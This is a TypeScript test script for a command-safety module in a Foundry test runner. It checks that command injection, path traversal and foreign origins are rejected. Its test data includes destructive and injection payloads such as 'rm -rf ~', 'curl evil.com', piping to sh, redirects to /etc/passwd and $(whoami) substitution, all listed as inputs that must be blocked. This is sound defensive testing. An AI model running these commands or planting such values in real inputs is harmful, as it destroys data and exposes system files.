import { parseAcceptanceCommand, assertRepoRoot, originAllowed, UnsafeCommand } from '../src/lib/runner/safety';

let fail = 0;
const ok = (n: string, c: boolean, x = '') => { if (!c) { fail++; console.log(`  FAIL  ${n} ${x}`); } else console.log(`  ok    ${n} ${x}`); };
const blocked = (name: string, cmd: string) => {
  try { parseAcceptanceCommand(cmd); fail++; console.log(`  FAIL  NOT BLOCKED: ${name} -> ${cmd}`); }
  catch (e) { ok(`blocked: ${name}`, e instanceof UnsafeCommand); }
};

console.log('--- legitimate commands parse to argv ---');
const p = parseAcceptanceCommand('forge test --match-path test/Merkle.t.sol -vvv');
ok('binary is forge', p.bin === 'forge');
ok('argv is an array, never a string', Array.isArray(p.args));
ok('--junit forced on', p.args.includes('--junit'), `(${p.args.join(' ')})`);
ok('no shell string anywhere', !p.args.some(a => /[;&|`$]/.test(a)));

console.log('\n--- injection attempts, all must be blocked ---');
blocked('command chaining',        'forge test; rm -rf ~');
blocked('backgrounded second cmd', 'forge test & curl evil.com');
blocked('pipe to shell',           'forge test | sh');
blocked('command substitution',    'forge test --match-path $(whoami)');
blocked('backtick substitution',   'forge test --match-path `id`');
blocked('subshell',                'forge test --match-path (id)');
blocked('newline injection',       'forge test\nrm -rf /');
blocked('redirect',                'forge test > /etc/passwd');
blocked('glob',                    'forge test --match-path test/*.sol');
blocked('home expansion',          'forge test --match-path ~/secrets');
blocked('path traversal',          'forge test --match-path ../../../../etc/passwd');
blocked('absolute path',           'forge test --match-path /etc/passwd');
blocked('quoted payload',          'forge test --match-path "a b"');
blocked('different binary',        'bash test');
blocked('forge but wrong sub',     'forge script Deploy.s.sol');
blocked('unknown flag',            'forge test --ffi');
blocked('flag missing value',      'forge test --match-path');
blocked('escape char',             'forge test --match-path test\\x.sol');

console.log('\n--- repo root validation ---');
const exists = (q: string) => ['/repo', '/repo/foundry.toml'].includes(q);
try { assertRepoRoot('/repo', exists); ok('valid foundry repo accepted', true); } catch { ok('valid foundry repo accepted', false); }
const rejects = (name: string, root: string) => {
  try { assertRepoRoot(root, exists); fail++; console.log(`  FAIL  NOT BLOCKED: ${name}`); }
  catch { ok(`blocked repo: ${name}`, true); }
};
rejects('relative path', 'repo');
rejects('traversal', '/repo/../etc');
rejects('nonexistent', '/nope');
rejects('empty', '');

console.log('\n--- origin allowlist ---');
ok('localhost allowed', originAllowed('http://localhost:3000', 'localhost:3000'));
ok('127.0.0.1 allowed', originAllowed('http://127.0.0.1:3000', '127.0.0.1:3000'));
ok('foreign origin blocked', !originAllowed('https://evil.com', 'localhost:3000'));
ok('port mismatch blocked', !originAllowed('http://localhost:9999', 'localhost:3000'));
ok('garbage origin blocked', !originAllowed('not-a-url', 'localhost:3000'));
ok('missing origin allowed (same-origin)', originAllowed(null, 'localhost:3000'));

console.log(`\n${fail === 0 ? 'ALL PASS' : fail + ' FAILURES'}`);
process.exit(fail ? 1 : 0);
